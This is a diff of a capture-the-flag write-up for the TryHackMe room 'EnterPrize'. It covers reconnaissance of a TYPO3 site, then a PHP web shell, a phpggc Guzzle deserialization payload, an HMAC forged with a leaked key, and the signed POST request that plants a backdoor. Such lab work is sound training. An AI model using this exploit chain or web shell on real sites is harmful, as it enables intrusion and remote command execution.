@@ -1,5 +1,7 @@
 <h1>EnterPrize</h1>
-<p>2025, August 2 - Day 453</p>
+<p>
+2025, August 2 - Day 453<br>
+2025, November 25 - Day 1</p>
 
 
 <img width="1902" height="307" alt="image" src="https://github.com/user-attachments/assets/8140e461-ae83-43c6-8b74-326c4dcc399d" />
@@ -10,16 +12,16 @@
 <h1 align="left">Summary</h1>
 <p>
 
-- [Port Scanning](#1)<br>
-- [Web Vulberability Scanning](#2)<br>
-- [Static Host Mapping](#3)<br>  
+- [Port Scanning](#1) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; 22 &nbsp;&nbsp; . &nbsp;&nbsp; 80 &nbsp;&nbsp; . &nbsp;&nbsp; 443<br>
+- [Static Host Mapping](#2) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; enterprize.thm<br>
+- [Web Vulberability Scanning](#3)<br>
 - [Web Vulberability Scanning](#3)<br>
 - [Web Interface Inspection](#4)<br>
-- [Subdomain Enumeration](#5)<br>
-- [Static Host Mapping](#6)<br>
-- [Web Interface Inspection](#7)<br>
+- [Subdomain Enumeration](#5) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; maintest<br>
+- [Static Host Mapping](#6) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; enterprize.thm &nbsp;&nbsp; . &nbsp;&nbsp; maintest.enterprize.thm<br>
+- [Web Interface Inspection](#7) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; TYPO3 CMS<br>
 - [Directory and File Enumeration](#8)<br>
-- [Web Interface Inspection](#9)<br>
+- [Web Interface Inspection](#9) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /typo3conf/LocalConfiguration.old &nbsp; . &nbsp; driver &nbsp; . &nbsp; mysli &nbsp; . &nbsp; host &nbsp; . &nbsp; dbname &nbsp; . &nbsp; password<br>
 
 
 - [Web Interface Inspection, Weaponization, Delivery & Execution](#5)<br>
@@ -32,21 +34,31 @@
 <br>
 <br>
 <br>
-<h2 align="center">Port Scanning<a id='1'></h2>
 
-<div align="center"><h6>
+<h1>Task 1 . Hack your way in</h1>
+<p>Deploy the machine and add <code>MACHINE_IP enterprize.thm</code> to your hosts file.<br>
 
-| **Port**     | **Service**     |
-|--------------:|:--------------------------|
-| `22`         | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3                      |
-| `80`         | Apache httpd                    |
-| `443 `       | https                      |
+Enumerate the target carefully. If you need a hint, you might want to save it for later.</p>
 
-</h6></div><br>
+<p><em>Answer the questions below</em></p>
+
+<br>
+
+<h1 align="center">Port Scanning<a id='1'></h1>
+
+<div align="center"><p>
+
+| **Port**     | **Protocol** |**Service**                      |
+|-------------:|-------------:|:--------------------------------|
+| `22`         | SSH          |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
+| `80`         | HTTP         |Apache httpd                     |
+| `443`        | HTTPS        |nginx                            |
+
+</p></div><br>
 
 
 ```bash
-:~/Enterprize# nmap -p- xx.xx.xx.xx
+:~/Enterprize# nmap -sT -p- -T4 xx.xx.xxx.xxx
 ...
 PORT    STATE  SERVICE
 22/tcp  open   ssh
@@ -55,47 +67,150 @@ PORT    STATE  SERVICE
 ```
 
 ```bash
-:~/Enterprize# nmap -sC -sV -Pn -p22,80,443 -T4 xx.xx.xx.xx
+:~/Enterprize# nmap -sC -sV -p22,80 --min-rate=10000 xx.xx.xxx.xxx
 ...
-PORT    STATE  SERVICE VERSION
-22/tcp  open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-...
-80/tcp  open   http    Apache httpd
+|   2048 67:c0:57:34:91:94:be:da:4c:fd:92:f2:09:9d:36:8b (RSA)
+|   256 13:ed:d6:6f:ea:b4:5b:87:46:91:6b:cc:58:4d:75:11 (ECDSA)
+|_  256 25:51:84:fd:ef:61:72:c6:9d:fa:56:5f:14:a1:6f:90 (ED25519)
+80/tcp open  http    Apache httpd
 |_http-server-header: Apache
 |_http-title: Blank Page
-443/tcp closed https
 ```
 
 ```bash
-:~/Enterprize#  rustscan -a xx.xx.xx.xx --ulimit 5500 -b 65535 -- -A -Pn
+:~/Enterprize# rustscan -a xx.xx.xxx.xxx --ulimit 5500 -b 65535 -- -A -Pn
+...
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 67:c0:57:34:91:94:be:da:4c:fd:92:f2:09:9d:36:8b (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdxS3na4GeYRrzzfQRZn/S3w1oFS9UMKUHyIrR0MIgjqXWulraEelyuL82K7Fv2zCcMlgSl+pzK+go6BhAzKG/+GfkpBquZm00CN/hzTJ07y14aseiVDOY/Gl6kWOO5upG2/8uQFi9tBSJLH4SJkcAag2l6tw7kZ9WYxkbAS9OMgSjmAROOhVwNTH3fSCdMhuQitC/b1F5F2grd43Li7w1jrNiROFnycbvyCxVkMxcVFSzr70caJ2CYw/WSZi3adJ8EtdY7XQj1nd2DaihIMGYUs9/J2vAK58fzqwnQNGbqQ19pJWyimmr6tFWGsBetdZm8bP56s6wqvVEEetmLl13
+|   256 13:ed:d6:6f:ea:b4:5b:87:46:91:6b:cc:58:4d:75:11 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLnmHA9LOr6rBx5KxdL++QodEFqNERudlCPb21dqEr1uxQplAKgqwfS11usQR1scxOMrBsth2QmLi/6R5CqJU/Q=
+|   256 25:51:84:fd:ef:61:72:c6:9d:fa:56:5f:14:a1:6f:90 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICw0LYJQC2A5p73rqH1M0Xi5SsfuiM+1JHkgEff7IT9M
+80/tcp open  http    syn-ack Apache httpd
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache
+|_http-title: Blank Page
 ```
 
 <br>
-<h2 align="center">Web Vulnerability Scanning<a id='2'></h2>
-<p align="center">/icons/README &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /composer.json</p>
-
-```bash
-:~/Enterprize# nikto -h http://
-```
-
-<br>
-<h2 align="center">Static Host Mapping<a id='3'></h2>
+<h1 align="center">Static Host Mapping<a id='2'></h1>
 
 ```bash
 xx.xx.xx.xx    enterprize.thm
 ```
 
 <br>
-<h2 align="center">Web Interface Inspection<a id='4'></h2>
+<h1 align="center">Web Vulnerability Scanning<a id='3'></h1>
+<p align="center">/icons/README &nbsp;&nbsp;&nbsp; - &nbsp;&nbsp;&nbsp; /composer.json</p>
+
+```bash
+~/Enterprize# nikto -h enterprize.thm -no404
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.80.187.214
++ Target Hostname:    enterprize.thm
++ Target Port:        80
++ Start Time:         2025-11-25 18:15:56 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /, fields: 0x55 0x5b80455b93e7e 
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2025-11-25 18:16:04 (GMT0) (8 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+<br>
+<h1 align="center">.....<a id='3'></h1>
+<p align="center">...</p>
+
+```bash
+:~/Enterprize# gobuster dir -u http://enterprize.thm/ -w /usr/share/dirb/wordlists/common.txt -x html,phps,json --exclude-length 199
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://enterprize.thm/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          199
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,phps,json
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/composer.json        (Status: 200) [Size: 589]
+/index.html           (Status: 200) [Size: 85]
+/index.html           (Status: 200) [Size: 85]
+Progress: 18456 / 18460 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+<img width="1232" height="436" alt="image" src="https://github.com/user-attachments/assets/585799af-1e59-4182-b415-2fd80579ffd1" />
+
+<br>
+<h1 align="center">Web Interface Inspection<a id='4'></h1>
 <h3 align="center">enterprize.thm</h3>
 
+<img width="1060" height="146" alt="image" src="https://github.com/user-attachments/assets/a8b07558-a14d-4296-913f-abe5f3418b60" />
 
 <h3 align="center">enterprize.thm/<code>composer.json</code></h3>
 
+```bash
+:~/Enterprize# curl http://enterprize.thm/composer.json
+{
+    "name": "superhero1/enterprize",
+    "description": "THM room EnterPrize",
+    "type": "project",
+    "require": {
+        "typo3/cms-core": "^9.5",
+        "guzzlehttp/guzzle": "~6.3.3",
+        "guzzlehttp/psr7": "~1.4.2",
+        "typo3/cms-install": "^9.5",
+	"typo3/cms-backend": "^9.5",
+        "typo3/cms-core": "^9.5",
+        "typo3/cms-extbase": "^9.5",
+        "typo3/cms-extensionmanager": "^9.5",
+        "typo3/cms-frontend": "^9.5",
+        "typo3/cms-install": "^9.5",
+	"typo3/cms-introduction": "^4.0"
+    },
+    "license": "GPL",
+    "minimum-stability": "stable"
+}
+```
+
+<img width="1057" height="423" alt="image" src="https://github.com/user-attachments/assets/69aaf522-309c-4968-853d-90997302284c" />
+
 <br>
-<h2 align="center">Subdomain Enumeration<a id='5'></h2>
-<h3 align="center">maintest</h3>
+<h3 align="center">enterprize.thm/<code>index.html</code></h3>
+
+```bash
+:~/Enterprize# curl http://enterprize.thm/index.html
+<html><head><title>Blank Page</title></head><body>Nothing to see here.</body></html>
+```
+
+<img width="1062" height="150" alt="image" src="https://github.com/user-attachments/assets/b3425cfa-a823-4ff3-a84e-5f1d14e9afbf" />
+
+
+<br>
+<h1 align="center">Subdomain Enumeration<a id='5'></h1>
 
 ```bash
 :~/Enterprize# ffuf -u http://enterprize.thm/ -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.enterprize.thm' -fs 85
@@ -104,20 +219,20 @@ maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
 ```
 
 <br>
-<h2 align="center">Static Host Mapping<a id='6'></h2>
+<h1 align="center">Static Host Mapping<a id='6'></h1>
 
 ```bash
 xx.xx.xx.xx    enterprize.thm maintest.enterprize.thm
 ```
 
 <br>
-<h2 align="center">Web Interface Inspection<a id='7'></h2>
+<h1 align="center">Web Interface Inspection<a id='7'></h1>
 <h3 align="center">main.enterprize.thm</h3><p align="center">TYPO3 CMS</p>
 
 <img width="1132" height="543" alt="image" src="https://github.com/user-attachments/assets/c6f53c06-8884-4339-8cd5-94471ce748a1" />
 
 <br>
-<h2 align="center">Directory & File Enumeration<a id='8'></h2>
+<h1 align="center">Directory & File Enumeration<a id='8'></h1>
 
 ```bash
 :~/EnterPrize/Typo3Scan# ffuf -u http://maintest.enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -fs 196 -t 80
@@ -130,8 +245,231 @@ server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                         [Status: 200, Size: 24555, Words: 1438, Lines: 49
 ```
 
+```bash
+:~/Enterprize# gobuster dir -u http://maintest.enterprize.thm/ -w /usr/share/dirb/wordlists/common.txt -e -k -q --exclude-length 199
+http://maintest.enterprize.thm/fileadmin            (Status: 301) [Size: 249] [--> http://maintest.enterprize.thm/fileadmin/]
+http://maintest.enterprize.thm/index.php            (Status: 200) [Size: 24555]
+http://maintest.enterprize.thm/typo3conf            (Status: 301) [Size: 249] [--> http://maintest.enterprize.thm/typo3conf/]
+http://maintest.enterprize.thm/typo3                (Status: 301) [Size: 245] [--> http://maintest.enterprize.thm/typo3/]
+http://maintest.enterprize.thm/typo3temp            (Status: 301) [Size: 249] [--> http://maintest.enterprize.thm/typo3temp/]
+```
+
+<img width="1232" height="139" alt="image" src="https://github.com/user-attachments/assets/6bac6a56-ae42-449d-9525-f28fefa9f8ec" />
+
 <br>
-<h2 align="center">Web Interface Inspection<a id='9'></h2>
+<br>
+
+```bash
+:~/Enterprize# gobuster dir -u http://maintest.enterprize.thm/fileadmin/ -w /usr/share/dirb/wordlists/common.txt -e -k -q --exclude-length 199
+http://maintest.enterprize.thm/fileadmin/introduction         (Status: 301) [Size: 262] [--> http://maintest.enterprize.thm/fileadmin/introduction/]
+http://maintest.enterprize.thm/fileadmin/user_upload          (Status: 301) [Size: 261] [--> http://maintest.enterprize.thm/fileadmin/user_upload/]
+```
+
+
+<img width="1227" height="90" alt="image" src="https://github.com/user-attachments/assets/60c08d50-daad-4318-b735-9dff5638266c" />
+
+<br>
+<br>
+<br>
+
+<h3>maintest.enterprize.thm/fileadmin/</h3>
+
+<img width="1059" height="323" alt="image" src="https://github.com/user-attachments/assets/3e4857e5-90f2-42c9-98d0-6bb46ec656e8" />
+
+<br>
+<br>
+<h3>maintest.enterprize.thm/index.php</h3>
+
+
+<img width="1275" height="793" alt="image" src="https://github.com/user-attachments/assets/66828091-0dc8-4fa8-9bf8-e09abdb374b1" />
+
+<br>
+<br>
+<h3>maintest.enterprize.thm/typo3conf/</h3>
+
+<img width="1264" height="347" alt="image" src="https://github.com/user-attachments/assets/7f9f98b4-a735-4dd4-a456-4de60944fb61" />
+
+<br>
+<br>
+<h3>maintest.enterprize.thm/typo3conf/LocalConfiguration.old</h3>
+
+<img width="1264" height="393" alt="image" src="https://github.com/user-attachments/assets/62f8a2c0-1bc6-4143-a16f-d20749ab8739" />
+
+
+```bash
+:~/Enterprize# gobuster dir -u http://maintest.enterprize.thm/fileadmin/ -w /usr/share/dirb/wordlists/common.txt -e -k -q --exclude-length 199
+http://maintest.enterprize.thm/fileadmin/introduction         (Status: 301) [Size: 262] [--> http://maintest.enterprize.thm/fileadmin/introduction/]
+http://maintest.enterprize.thm/fileadmin/user_upload          (Status: 301) [Size: 261] [--> http://maintest.enterprize.thm/fileadmin/user_upload/]
+```
+
+
+
+
+:~/Enterprize/phpggc# cat exploitation.php
+<?php $output = system($_GET[1]); echo $output ; ?>
+
+
+
+
+root@ip-10-80-69-92:~/Enterprize# git clone https://github.com/ambionics/phpggc
+Cloning into 'phpggc'...
+remote: Enumerating objects: 4860, done.
+remote: Counting objects: 100% (920/920), done.
+remote: Compressing objects: 100% (306/306), done.
+remote: Total 4860 (delta 709), reused 619 (delta 614), pack-reused 3940 (from 3)
+Receiving objects: 100% (4860/4860), 706.02 KiB | 13.84 MiB/s, done.
+Resolving deltas: 100% (2222/2222), done.
+
+
+root@ip-10-80-69-92:~/Enterprize# ls
+exploitation.php  phpggc  reports
+
+
+root@ip-10-80-69-92:~/Enterprize# cd phpggc
+
+
+root@ip-10-80-69-92:~/Enterprize/phpggc# ls
+Dockerfile  gadgetchains  lib  LICENSE  phpggc  README.md  templates  test-gc-compatibility.py
+
+
+root@ip-10-80-69-92:~/Enterprize/phpggc# ./phpggc -l Guzzle
+
+Gadget Chains
+-------------
+
+NAME                     VERSION                         TYPE                  VECTOR        I    
+Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
+Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
+Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
+Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
+WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
+WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *    
+
+
+:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/exploitation.php
+YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==
+
+
+
+
+:~/Enterprize/phpggc# cat a.php
+<?php
+echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
+?>
+
+
+92:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/rosa.php /root/Enterprize/phpggc/a.php > r.txt
+
+
+root@ip-10-80-69-92:~/Enterprize/phpggc# cat r.txt
+YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vcm9zYS5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6ODUwOiI8P3BocAokc2VjcmV0ID0gaGFzaF9obWFjKCdzaGExJywgJ1lUb3lPbnRwT2pjN1R6b3pNVG9pUjNWNmVteGxTSFIwY0Z4RGIyOXJhV1ZjUm1sc1pVTnZiMnRwWlVwaGNpSTZORHA3Y3pvME1Ub2lBRWQxZW5wc1pVaDBkSEJjUTI5dmEybGxYRVpwYkdWRGIyOXJhV1ZLWVhJQVptbHNaVzVoYldVaU8zTTZOVEE2SWk5MllYSXZkM2QzTDJoMGJXd3ZjSFZpYkdsakwyWnBiR1ZoWkcxcGJpOWZkR1Z0Y0Y4dlltRmphMlJ2YjNJdWNHaHdJanR6T2pVeU9pSUFSM1Y2ZW14bFNIUjBjRnhEYjI5cmFXVmNSbWxzWlVOdmIydHBaVXBoY2dCemRHOXlaVk5sYzNOcGIyNURiMjlyYVdWeklqdGlPakU3Y3pvek5qb2lBRWQxZW5wc1pVaDBkSEJjUTI5dmEybGxYRU52YjJ0cFpVcGhjZ0JqYjI5cmFXVnpJanRoT2pFNmUyazZNRHRQT2pJM09pSkhkWHA2YkdWSWRIUndYRU52YjJ0cFpWeFRaWFJEYjI5cmFXVWlPakU2ZTNNNk16TTZJZ0JIZFhwNmJHVklkSFJ3WEVOdmIydHBaVnhUWlhSRGIyOXJhV1VBWkdGMFlTSTdZVG96T250ek9qYzZJa1Y0Y0dseVpYTWlPMms2TVR0ek9qYzZJa1JwYzJOaGNtUWlPMkk2TUR0ek9qVTZJbFpoYkhWbElqdHpPalV5T2lJOFAzQm9jQ0FrYjNWMGNIVjBJRDBnYzNsemRHVnRLQ1JmUjBWVVd6RmRLVHNnWldOb2J5QWtiM1YwY0hWMElEc2dQejRLSWp0OWZYMXpPak01T2lJQVIzVjZlbXhsU0hSMGNGeERiMjlyYVdWY1EyOXZhMmxsU21GeUFITjBjbWxqZEUxdlpHVWlPMDQ3ZldrNk56dHBPamM3ZlE9PScsICc3MTJkZDRkOWM1ODM0ODI5NDBiNzU1MTRlMzE0MDBjMTFiZGNiYzczNzRjOGU2Mm
+
+
+
+
+
+:~/Enterprize/phpggc# cat r.txt | openssl dgst -sha1 -hmac '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'
+(stdin)= 2d7a22d739933b5856fb6e7421548a9b4522bcdc
+
+
+
+POST /index.php?id=38&tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=63896b2174306c4f96ada29453d1cd18 HTTP/1.1
+Host: maintest.enterprize.thm
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------135680671225349365022964922376
+Content-Length: 2259
+Origin: http://maintest.enterprize.thm
+Connection: keep-alive
+Referer: http://maintest.enterprize.thm/index.php?id=38
+Cookie: cookieconsent_status=dismiss; fe_typo_user=3c47f4fe60c1e06fc5dbb78428c11c7f
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][__state]"
+
+YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==2d7a22d739933b5856fb6e7421548a9b4522bcdc
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[__trustedProperties]"
+
+a:1:{s:15:"contactForm-144";a:6:{s:4:"name";i:1;s:7:"subject";i:1;s:15:"HtZRaJ2BGcK46Xj";i:1;s:5:"email";i:1;s:7:"message";i:1;s:13:"__currentPage";i:1;}}e5a2f75ca729afe499660474d3fc1b75fee1b4da
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][name]"
+
+test
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][subject]"
+
+test
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][HtZRaJ2BGcK46Xj]"
+
+
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][email]"
+
+lulu@mail.com
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][message]"
+
+test
+-----------------------------135680671225349365022964922376
+Content-Disposition: form-data; name="tx_form_formframework[contactForm-144][__currentPage]"
+
+2
+-----------------------------135680671225349365022964922376--
+
+
+
+
+
+Response
+
+<div class="frame-inner">Oops, an error occurred! Code: 20251125201918369d7f80</div>
+
+
+
+sudo apt install -y php7.4 php7.4-cli php7.4-common php7.4-mysql php7.4-zip php7.4-gd php7.4-mbstring php7.4-curl php7.4-xml php7.4-fpm libapache2-mod-php7.4
+
+
+
+:~/Enterprize/phpggc# php -v
+PHP 7.4.3-4ubuntu2.29 (cli) (built: Mar 25 2025 18:57:03) ( NTS )
+Copyright (c) The PHP Group
+Zend Engine v3.4.0, Copyright (c) Zend Technologies
+    with Zend OPcache v7.4.3-4ubuntu2.29, Copyright (c), by Zend Technologies
+
+
+
+
+
+
+
+
+<img width="1171" height="654" alt="image" src="https://github.com/user-attachments/assets/aaf561ac-aed0-4d71-927e-34a2f5f6e126" />
+
+
+
+
+<img width="1171" height="536" alt="image" src="https://github.com/user-attachments/assets/1939911f-df18-4dfe-9e09-6c0699c29737" />
+
+
+
+
+<img width="1163" height="505" alt="image" src="https://github.com/user-attachments/assets/2d2d7621-37da-4fae-83e3-439ce84da4aa" />
+
+
+<img width="1167" height="410" alt="image" src="https://github.com/user-attachments/assets/83859309-66c1-4bfe-895a-0ca9613197c4" />
+
+
+
+
+
+<br>
+<h1 align="center">Web Interface Inspection<a id='9'></h1>
 <h3 align="center">maintest.enterprize.thm/<code>typo3</code>/</h3>
 
 <img width="1129" height="500" alt="image" src="https://github.com/user-attachments/assets/d72fb7b7-c69b-4e01-b542-45e8c21d7099" />
